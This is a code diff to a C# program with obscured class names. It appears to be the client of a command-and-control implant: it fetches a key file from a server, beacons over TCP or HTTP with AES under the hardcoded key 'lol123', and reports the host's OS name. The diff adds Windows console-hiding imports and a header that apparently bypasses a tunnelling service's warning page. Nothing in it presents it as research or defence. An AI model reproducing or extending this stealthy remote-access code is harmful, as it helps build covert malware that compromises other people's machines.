@@ -14,11 +14,24 @@ using System.Net;
 using hevsn;
 using cevsn.encrn.rsa;
 using cevsn.encrn;
+using System.Runtime.InteropServices;
 
 namespace cevsn
 {
     public class Cevsn
     {
+        //Windows hide Console
+        [DllImport("kernel32.dll", EntryPoint = "GetStdHandle", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+        public static extern IntPtr GetStdHandle(int nStdHandle);
+
+        [DllImport("kernel32.dll", EntryPoint = "AllocConsole", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+        public static extern int AllocConsole();
+
+        private const int STD_OUTPUT_HANDLE = -11;
+        private const int MY_CODE_PAGE = 437;
+        private static bool showConsole = true;
+
+
         public static String URL = "http://127.0.0.1:8082/initialRSA.txt";
         public static String UUID = Guid.NewGuid().ToString();
         public volatile static byte[] iv = new byte[16];
@@ -45,6 +58,7 @@ namespace cevsn
 
         public static async Task Main(string[] args)
         {
+
             gotHostInformation = false;
             Running = true;
 
@@ -78,7 +92,7 @@ namespace cevsn
                             Console.Write("Trying to connect to TCP...\n");
                             if(checker == false)
                             {
-                                tevsn = CreateTevsn(IP, PORT, Key);
+                                tevsn = CreateTevsn(IP, PORT, Key, getOsName());
                                 tevsn.ServerAddress = new IPEndPoint(IPAddress.Parse(IP), PORT);
                                 checker = true;
                             }
@@ -162,7 +176,7 @@ namespace cevsn
                         }
                         if(Type.Equals("HTTP"))
                         {
-                            //hevsn = new Hevsn("http://127.0.0.1:"+PORT+"/lit", rsa!);
+                            //hevsn = new Hevsn("http://127.0.0.1:8082:"+PORT+"/lit", rsa!);
                             if(!firstHTTP)
                             {
                                 hevsn = new Hevsn("http://127.0.0.1:"+PORT+"/lit", aes!);
@@ -226,6 +240,7 @@ namespace cevsn
         {
             try 
             {
+                client.DefaultRequestHeaders.Add("Bypass-Tunnel-Reminder", "Flip");
                 Task<string> response = client.GetStringAsync(URL);
                 if(response.Result.ToString().Length > 5)
                 {
@@ -260,11 +275,12 @@ namespace cevsn
             }
         }
 
-        public static Tevsn CreateTevsn(string ip, int port, string key)
+        public static Tevsn CreateTevsn(string ip, int port, string key, string os)
         {
             //rsa = new encrn.rsa.RSA(key);
             aes = new AES("lol123", iv);
-            return new Tevsn(ip, port, aes);
+            Console.Write(ip + "\n");
+            return new Tevsn(ip, port, aes, os);
         }
     }
 }
